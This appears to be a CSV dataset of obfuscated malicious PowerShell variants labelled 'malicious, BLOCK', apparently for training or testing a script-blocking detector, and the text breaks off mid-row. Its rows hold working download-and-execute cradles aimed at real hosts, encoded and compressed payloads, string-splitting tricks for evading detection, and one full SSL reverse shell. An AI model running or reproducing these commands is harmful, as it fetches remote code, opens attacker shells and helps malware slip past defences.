+variant_937e4a710e78,seed_109e3e5424a0,338__seed_109e3e5424a0__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,3,2,True,86,86,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,0ceeaeb87c8a,2e1ae9581592,&('I'+'EX') (New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt'),DownloadString,strict,parse_valid_and_invariants_ok
+variant_db38e58cbba8,seed_109e3e5424a0,338__seed_109e3e5424a0__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,3,2,True,100,100,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,0ceeaeb87c8a,a5296ae1938e,&([scriptblock]::Create((New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt'))),DownloadString,strict,parse_valid_and_invariants_ok
+variant_2720e629f18f,seed_109e3e5424a0,338__seed_109e3e5424a0__downloadstring_psobject_invoke.ps1,malicious,BLOCK,downloadstring_psobject_invoke,string_construction,cross_runtime,3,DownloadString,3,2,True,108,108,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,0ceeaeb87c8a,aacbbaf2604f,IEX (New-Object Net.WebClient).PSObject.Methods['Download'+'String'].Invoke('http://91.120.23.152/wizz.txt'),DownloadString,strict,parse_valid_and_invariants_ok
+variant_e30a68715d39,seed_36e17531a823,cc76beb5bcf6880dee2d739a37e218871500d5d610c7989e7371b2594c2d594e__seed_36e17531a823__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,3,2,True,88,88,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,ff8181725f22,0b66636a1ad3,&('I'+'EX') ((New-Object Net.WebClient).DownloadString('http://192.168.137.241:8080/'));,DownloadString,strict,parse_valid_and_invariants_ok
+variant_6db2e9146f2e,seed_36e17531a823,cc76beb5bcf6880dee2d739a37e218871500d5d610c7989e7371b2594c2d594e__seed_36e17531a823__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,3,2,True,102,102,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,ff8181725f22,99b45bd6c38e,&([scriptblock]::Create(((New-Object Net.WebClient).DownloadString('http://192.168.137.241:8080/'))));,DownloadString,strict,parse_valid_and_invariants_ok
+variant_43762b130597,seed_36e17531a823,cc76beb5bcf6880dee2d739a37e218871500d5d610c7989e7371b2594c2d594e__seed_36e17531a823__downloadstring_psobject_invoke.ps1,malicious,BLOCK,downloadstring_psobject_invoke,string_construction,cross_runtime,3,DownloadString,3,2,True,110,110,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,ff8181725f22,51b193fdfb6d,IEX ((New-Object Net.WebClient).PSObject.Methods['Download'+'String'].Invoke('http://192.168.137.241:8080/'));,DownloadString,strict,parse_valid_and_invariants_ok
+variant_657cf96b4969,seed_eb139569f490,3100__seed_eb139569f490__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,3,2,True,89,89,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,1b1d6c53362b,92d909324b8b,&('I'+'EX') ((new-object net.webclient).downloadstring('http://pmlabs.net/cis/test.jpg')),DownloadString,strict,parse_valid_and_invariants_ok
+variant_fad3b0f36ffe,seed_eb139569f490,3100__seed_eb139569f490__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,3,2,True,103,103,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,1b1d6c53362b,bf8ee271b3a4,&([scriptblock]::Create(((new-object net.webclient).downloadstring('http://pmlabs.net/cis/test.jpg')))),DownloadString,strict,parse_valid_and_invariants_ok
+variant_a52b1fee6756,seed_eb139569f490,3100__seed_eb139569f490__downloadstring_psobject_invoke.ps1,malicious,BLOCK,downloadstring_psobject_invoke,string_construction,cross_runtime,3,DownloadString,3,2,True,111,111,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,1b1d6c53362b,1ca64cb3a72c,IEX ((new-object net.webclient).PSObject.Methods['Download'+'String'].Invoke('http://pmlabs.net/cis/test.jpg')),DownloadString,strict,parse_valid_and_invariants_ok
+variant_c586c265a486,seed_dc2fdf741f87,3438__seed_dc2fdf741f87__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,3,2,True,89,89,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8364ef2f611,64f310214d8e,"&('I'+'EX') (New-Object Net.WebClient).DownloadString(""http://52.183.79.94:80/TYBMkTfsQ"")",DownloadString,strict,parse_valid_and_invariants_ok
+variant_197c8f370a70,seed_dc2fdf741f87,3438__seed_dc2fdf741f87__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,3,2,True,103,103,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8364ef2f611,b162837faec5,"&([scriptblock]::Create((New-Object Net.WebClient).DownloadString(""http://52.183.79.94:80/TYBMkTfsQ"")))",DownloadString,strict,parse_valid_and_invariants_ok
+variant_a4a65e9619ea,seed_dc2fdf741f87,3438__seed_dc2fdf741f87__downloadstring_psobject_invoke.ps1,malicious,BLOCK,downloadstring_psobject_invoke,string_construction,cross_runtime,3,DownloadString,3,2,True,111,111,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8364ef2f611,58458eee7811,"iex (New-Object Net.WebClient).PSObject.Methods['Download'+'String'].Invoke(""http://52.183.79.94:80/TYBMkTfsQ"")",DownloadString,strict,parse_valid_and_invariants_ok
+variant_478725f41b70,seed_c61abb38370f,67508635020243fc67eb003f214fc569733988db121516a1571f3c8de2589864__seed_c61abb38370f__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,3,2,True,98,98,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,fe8fd327b0a9,9edd123f27d5,&('I'+'EX') (New-Object Net.WebClient).DownloadString('http://cannot.loginto.me/googlehelper.ps1'),DownloadString,strict,parse_valid_and_invariants_ok
+variant_79651ce4f31b,seed_c61abb38370f,67508635020243fc67eb003f214fc569733988db121516a1571f3c8de2589864__seed_c61abb38370f__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,3,2,True,112,112,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,fe8fd327b0a9,7b2316d7d487,&([scriptblock]::Create((New-Object Net.WebClient).DownloadString('http://cannot.loginto.me/googlehelper.ps1'))),DownloadString,strict,parse_valid_and_invariants_ok
+variant_0bd1909d9592,seed_c61abb38370f,67508635020243fc67eb003f214fc569733988db121516a1571f3c8de2589864__seed_c61abb38370f__downloadstring_psobject_invoke.ps1,malicious,BLOCK,downloadstring_psobject_invoke,string_construction,cross_runtime,3,DownloadString,3,2,True,120,120,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,fe8fd327b0a9,956b119f68b1,IEX (New-Object Net.WebClient).PSObject.Methods['Download'+'String'].Invoke('http://cannot.loginto.me/googlehelper.ps1'),DownloadString,strict,parse_valid_and_invariants_ok
+variant_da7a438bd2fb,seed_e517072ea782,f1f2958356c98c4d296a747490c067cc11cd53b2812e5d69846069aef6d9adb6__seed_e517072ea782__invoke_expression_call_operator_string.ps1,malicious,BLOCK,invoke_expression_call_operator_string,execution_indirection,cross_runtime,1,Invoke-Expression,3,2,True,98,98,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f1f2958356c9,37dbdde7f3de,&('Invoke-'+'Expression') (New-Object Net.Webclient).Downloadstring('http://tinyurl.com/y7ukpduz'),DownloadString,strict,parse_valid_and_invariants_ok
+variant_a4544529202a,seed_e517072ea782,f1f2958356c98c4d296a747490c067cc11cd53b2812e5d69846069aef6d9adb6__seed_e517072ea782__invoke_expression_scriptblock_create.ps1,malicious,BLOCK,invoke_expression_scriptblock_create,execution_indirection,cross_runtime,2,Invoke-Expression,3,2,True,98,98,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f1f2958356c9,54b018046463,&([scriptblock]::Create((New-Object Net.Webclient).Downloadstring('http://tinyurl.com/y7ukpduz'))),DownloadString,strict,parse_valid_and_invariants_ok
+variant_d4af70397078,seed_e517072ea782,f1f2958356c98c4d296a747490c067cc11cd53b2812e5d69846069aef6d9adb6__seed_e517072ea782__downloadstring_psobject_invoke.ps1,malicious,BLOCK,downloadstring_psobject_invoke,string_construction,cross_runtime,3,DownloadString,3,2,True,120,120,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f1f2958356c9,5939f2de9ba1,Invoke-Expression (New-Object Net.Webclient).PSObject.Methods['Download'+'String'].Invoke('http://tinyurl.com/y7ukpduz'),DownloadString,strict,parse_valid_and_invariants_ok
+variant_453c2b9c6b77,seed_0de74614c959,231032778ec6e8baa7807ce3aeae9924bd62a36516d2655219d9334e0339c874__seed_0de74614c959__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,2,1,True,150,150,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,494c25752b66,9bcf4fca061e,"$qwertyuioop = @'
+
+'@
+
+
+$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qwertyuioop))
+
+&('I'+'EX') $Decryption",FromBase64String,strict,parse_valid_and_invariants_ok
+variant_5963b308653f,seed_0de74614c959,231032778ec6e8baa7807ce3aeae9924bd62a36516d2655219d9334e0339c874__seed_0de74614c959__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,2,1,True,164,164,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,494c25752b66,ce6493a00424,"$qwertyuioop = @'
+
+'@
+
+
+$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qwertyuioop))
+
+&([scriptblock]::Create($Decryption))",FromBase64String,strict,parse_valid_and_invariants_ok
+variant_acf45cbb1f6e,seed_a4fecca9d2bf,f55369c6d50c5a57c0a54c0d1a1560c0601e17f08d64f94a0fea9eed9768beae__seed_a4fecca9d2bf__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,1,0,True,35,35,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f55369c6d50c,c3ff24f6025b,irm massgrave.dev/get | &('I'+'EX'),IEX,strict,parse_valid_and_invariants_ok
+variant_db16bee2775b,seed_5f819bb0b3c0,93a790e0a65d0a47a7988e81f069c4c7044802c50848735dcaf0f6b0ef921dcd__seed_5f819bb0b3c0__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,1,0,True,43,43,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,93a790e0a65d,93c505a89b58,irm https://massgrave.dev/get | &('I'+'EX'),IEX,strict,parse_valid_and_invariants_ok
+variant_4bc5086d8267,seed_b29df5de3d49,fc9da60ea75819923b8a947dfe2ac25422bc534ae45b680bb8b177cb2e90415d__seed_b29df5de3d49__invoke_expression_scriptblock_create.ps1,malicious,BLOCK,invoke_expression_scriptblock_create,execution_indirection,cross_runtime,1,Invoke-Expression,1,0,True,955,955,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,4dd7914e7f04,67678fc06139,"powershell -nop -W hidden -noni -ep bypass -c ""$TCPClient = New-Object Net.Sockets.TCPClient('198.58.102.19', 9333);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {&([scriptblock]::Create($Command 2>&1 | Out-String))} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()""",Invoke-Expression,strict,parse_valid_and_invariants_ok
+variant_df966990131b,seed_a5cda033f923,2019__seed_a5cda033f923__invoke_expression_call_operator_string.ps1,malicious,BLOCK,invoke_expression_call_operator_string,execution_indirection,cross_runtime,1,Invoke-Expression,2,1,True,1181,1181,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8b40e6d331b,1995c9d8ca3d,"&('Invoke-'+'Expression') $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",Invoke-Expression,strict,parse_valid_and_invariants_ok
+variant_be59e4c58165,seed_a5cda033f923,2019__seed_a5cda033f923__invoke_expression_scriptblock_create.ps1,malicious,BLOCK,invoke_expression_scriptblock_create,execution_indirection,cross_runtime,2,Invoke-Expression,2,1,True,1181,1181,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8b40e6d331b,58bcfea9ff69,"&([scriptblock]::Create($(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()));",Invoke-Expression,strict,parse_valid_and_invariants_ok
+variant_dcd8d67c1229,seed_9467821f5750,2789__seed_9467821f5750__invoke_expression_call_operator_string.ps1,malicious,BLOCK,invoke_expression_call_operator_string,execution_indirection,cross_runtime,1,Invoke-Expression,2,1,True,1633,1633,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,864d37caca0b,15de3bfc42b7,"&('Invoke-'+'Expression') $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('rVZtb5tIEP4eKf9hzuHOoBpku011FymVUuo7WUpTK0TKB8u6EBgHLngXLYtflPa/3+yCDdiO4zsVJQaWmWefGZ6ZYZqzQMacwZDN+TPaI75A4UWYJHdBCqcnL/QPdIzdWZig/ByzMGZP5hec+nkiR77wZyjJA+UNXV22BM5RZNiyJqAfmqcnBYAG2dibI57Fet9L6Hbgq89CX3KxoltDihw7cAj6vyJO/STbC/lI4TTxPCkovtqKMRxdhaHALOu8HUrvp4dyLOJuJEMm62GMuJCvRnAcQW8RyyCqg94WZsfj7kn4DqjS2BrQWl8Uv5KSUFy9VA5nLmcMAwmPfvAM8RRkhFAGAJmGhziDPMPQqbzIzlzzt6rlGq4mEyQxMkmZv8GF/e3xH7WPt8okzpwblI7Hg2eUmXPnjlxtadb0onNew/5RT9OZChMk12xTwedxiCGk5KGo6YeHuSuTA8STmEgyFER9vI9wkF6XFhPN8xV3J5O+kKZVvYPd1FTGV0GAqSTsMhn14KEevZFJgf5MORcwzl8oPb1Wdxo/riSOJxNDnTNV2Y7z8fz8/fn3X1+6zXR6SBnTCghyIRQxSppgpDqg+oGAz9JcFgt1GuS1xjbHEpfSQRZw1eMmFxdXnjscWoraZ2Vjtu4p53yRQdUlQeSMkTX4+i0JaME7MJDNLzbbv6M1quXNgzoV9fCBuTxdifgpkmC6FvS7vXP4GgeCZ3wqweWCVOGrfuDAldpRWWakcNpgTrp4YA+sZe3k1rkXsUSzCrHT7VQ3zjWyJxlZzRxGfEHZgpgRPZ/mwhzroZJKZ6n839lrjzxoU8AmrdjXPNAhWc7IlxGttj+1f0YMiyhO0DSNWEmrBLlFPzQLCXXUbDAa3hbYDKF7oJQGKiYM7yi+ZiOw71Ypqsa2bgnKxNFxD8o8bEFRI/cVsxpkqXw1VY11jGDEVtOTOl9zYYukfn+DJQakLN1SSGUzJXxSnrqlKn6i8t91KtKp6obeYfkRMFimqoGpCWS7JU5Bvf/ptx58h2+5tAvOsMXzR/OWXnIQvUlcv2X73he6kloep6ERqcuFquOF4OoyJpmgDlDx4tNXImzBa/gDIbgA4++DhDfp6INW0Do5JNA35AvtLaSlyqiBatdxd9LI2lbSCiMnSNAX5vazitBl/YaaybIufHWc3aLMBSsHYEYfaNk+MBLZUQVb7bbDaW911ouzqs19jn8meRapodIYjhurciS4Cc+wng8999bD5ojZ53iSp6a1s0l5qomzhnCEGH8BN8LqW0P3YaHmNAUXRP5jUsycFc/BF0hzQbkXRUmjiRqHGvMNpe5TKLGkv73f5Xb54QL25msDen/0nd7H350PdHrfB1sNdfhAx+nJvw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",Invoke-Expression,strict,parse_valid_and_invariants_ok
+variant_7bdef4f0ac93,seed_9467821f5750,2789__seed_9467821f5750__invoke_expression_scriptblock_create.ps1,malicious,BLOCK,invoke_expression_scriptblock_create,execution_indirection,cross_runtime,2,Invoke-Expression,2,1,True,1633,1633,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,864d37caca0b,2bcab24b3421,"&([scriptblock]::Create($(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('rVZtb5tIEP4eKf9hzuHOoBpku011FymVUuo7WUpTK0TKB8u6EBgHLngXLYtflPa/3+yCDdiO4zsVJQaWmWefGZ6ZYZqzQMacwZDN+TPaI75A4UWYJHdBCqcnL/QPdIzdWZig/ByzMGZP5hec+nkiR77wZyjJA+UNXV22BM5RZNiyJqAfmqcnBYAG2dibI57Fet9L6Hbgq89CX3KxoltDihw7cAj6vyJO/STbC/lI4TTxPCkovtqKMRxdhaHALOu8HUrvp4dyLOJuJEMm62GMuJCvRnAcQW8RyyCqg94WZsfj7kn4DqjS2BrQWl8Uv5KSUFy9VA5nLmcMAwmPfvAM8RRkhFAGAJmGhziDPMPQqbzIzlzzt6rlGq4mEyQxMkmZv8GF/e3xH7WPt8okzpwblI7Hg2eUmXPnjlxtadb0onNew/5RT9OZChMk12xTwedxiCGk5KGo6YeHuSuTA8STmEgyFER9vI9wkF6XFhPN8xV3J5O+kKZVvYPd1FTGV0GAqSTsMhn14KEevZFJgf5MORcwzl8oPb1Wdxo/riSOJxNDnTNV2Y7z8fz8/fn3X1+6zXR6SBnTCghyIRQxSppgpDqg+oGAz9JcFgt1GuS1xjbHEpfSQRZw1eMmFxdXnjscWoraZ2Vjtu4p53yRQdUlQeSMkTX4+i0JaME7MJDNLzbbv6M1quXNgzoV9fCBuTxdifgpkmC6FvS7vXP4GgeCZ3wqweWCVOGrfuDAldpRWWakcNpgTrp4YA+sZe3k1rkXsUSzCrHT7VQ3zjWyJxlZzRxGfEHZgpgRPZ/mwhzroZJKZ6n839lrjzxoU8AmrdjXPNAhWc7IlxGttj+1f0YMiyhO0DSNWEmrBLlFPzQLCXXUbDAa3hbYDKF7oJQGKiYM7yi+ZiOw71Ypqsa2bgnKxNFxD8o8bEFRI/cVsxpkqXw1VY11jGDEVtOTOl9zYYukfn+DJQakLN1SSGUzJXxSnrqlKn6i8t91KtKp6obeYfkRMFimqoGpCWS7JU5Bvf/ptx58h2+5tAvOsMXzR/OWXnIQvUlcv2X73he6kloep6ERqcuFquOF4OoyJpmgDlDx4tNXImzBa/gDIbgA4++DhDfp6INW0Do5JNA35AvtLaSlyqiBatdxd9LI2lbSCiMnSNAX5vazitBl/YaaybIufHWc3aLMBSsHYEYfaNk+MBLZUQVb7bbDaW911ouzqs19jn8meRapodIYjhurciS4Cc+wng8999bD5ojZ53iSp6a1s0l5qomzhnCEGH8BN8LqW0P3YaHmNAUXRP5jUsycFc/BF0hzQbkXRUmjiRqHGvMNpe5TKLGkv73f5Xb54QL25msDen/0nd7H350PdHrfB1sNdfhAx+nJvw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()));",Invoke-Expression,strict,parse_valid_and_invariants_ok
+variant_fbad6767931a,seed_b425d8ade6ab,809c76fa535ae6532ce29d85d8ca042036f4d0c3f4a536efecdf78e5b85e9c5b__seed_b425d8ade6ab__invoke_expression_call_operator_string.ps1,malicious,BLOCK,invoke_expression_call_operator_string,execution_indirection,cross_runtime,1,Invoke-Expression,2,1,True,1695,1695,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,809c76fa535a,4ec8dd1ff7b6,"&('Invoke-'+'Expression') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""9tzZlp2dkAibvl2czVmcwhXRtU2avZnbJtTKw0lchh2YbhSbpJHVukCZrFHdkgyZulmc0NFdldkL4YEVVpjOddmbpR2bj5WRuQHelRlLtVGdzl3UbBSPgcWZqdHJ7kiNxASLggGdn5WZM5iYj9WYkACL2EDIsI2YvFGJos2YvxmQsFmbpZUby9mZz5WYyRlL0l3dhRCI9ACZrFHdksTKoI3b0BXeyNWZEVGdhVmcD5iZrNXckASPgQXe3FGJ7kyZxZHekgyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1Wg0DI5V2SuY2azFHJ7EGbwRCI9AiVJ5iZrNXcksjN1IDI9ASZ6l2U5V2SuY2azFHJ7gjMxASPgUmepN1aj9GbC5iZrNXckszcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5iZrNXckszQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5iZrNXcksjIkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UiACdjVmai9UL3VmTg0DImt2cxRyOdVTMu4CMbJ2YvFGJg0DIhxGcksTKj1WcwRCKn5WayR3U0YTZzFmQt9mcGpjOdRnclZnbvNkLtVGdzl3UbBSPgI2YvFGJ7IiIgwiIcxlIgU2YhxGclJXLgMWbxBHJg0DIj1WcwRyOlVHbhZlLdFzWzBXdvJ3RukiI68DX68DXp8jKugyPc9DX6ojIgwSbvBHbkgCajRXYNpjOdhXZnVmcbBSPgMWbxBHJ7kSbzRXckgyZulmc0NFZh9Gbud3bE5SK05WZpx2QiV2VuQXZOBCdjVmai9WL3VmboASPg02bwxGJ7BSKyVmbpFGdu92QgUGc5RFa0FGUtAyc45mbkACa0FGUtACa0FGUtQ3clRFKgYWa7ICXiAyKgEnbzlHJgsCIiwlIgsCItFXe4RCI9Ayc45mbksTKpIyaXRDNigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DIx52c5RyOoRXYQ5SKu9Wa0F2YvxWL0V2ZoQCI9ASbxlHeksjI9ADM0pVe65GZN9CO4pkNiJ0MpN1bqN3MvRHUGxGSwoWMHBDUuJ3VmJHZ2tmIg0DInFnd4RyOpkiI1ljMjFXNT5UNnR0T6dmIgsCIiQkT3dmeMZnVHpFcaNDT5l1MMJCIrAiIwJEWZZHMyIma1knYsFzVhJTO5JCIrAiIMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DItNHdxRyOiQTNzYDMiBTOhRTN4MzYxIGZlFTMhZWMkRzNwUmZhFGNiASPgQWa1VHJ""[-1..-1568] -join '')));",Invoke-Expression,strict,parse_valid_and_invariants_ok
+variant_4e1d2783d11a,seed_b425d8ade6ab,809c76fa535ae6532ce29d85d8ca042036f4d0c3f4a536efecdf78e5b85e9c5b__seed_b425d8ade6ab__invoke_expression_scriptblock_create.ps1,malicious,BLOCK,invoke_expression_scriptblock_create,execution_indirection,cross_runtime,2,Invoke-Expression,2,1,True,1695,1695,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,809c76fa535a,7fc7012b4617,"&([scriptblock]::Create(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""9tzZlp2dkAibvl2czVmcwhXRtU2avZnbJtTKw0lchh2YbhSbpJHVukCZrFHdkgyZulmc0NFdldkL4YEVVpjOddmbpR2bj5WRuQHelRlLtVGdzl3UbBSPgcWZqdHJ7kiNxASLggGdn5WZM5iYj9WYkACL2EDIsI2YvFGJos2YvxmQsFmbpZUby9mZz5WYyRlL0l3dhRCI9ACZrFHdksTKoI3b0BXeyNWZEVGdhVmcD5iZrNXckASPgQXe3FGJ7kyZxZHekgyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1Wg0DI5V2SuY2azFHJ7EGbwRCI9AiVJ5iZrNXcksjN1IDI9ASZ6l2U5V2SuY2azFHJ7gjMxASPgUmepN1aj9GbC5iZrNXckszcvJXZapjOdVG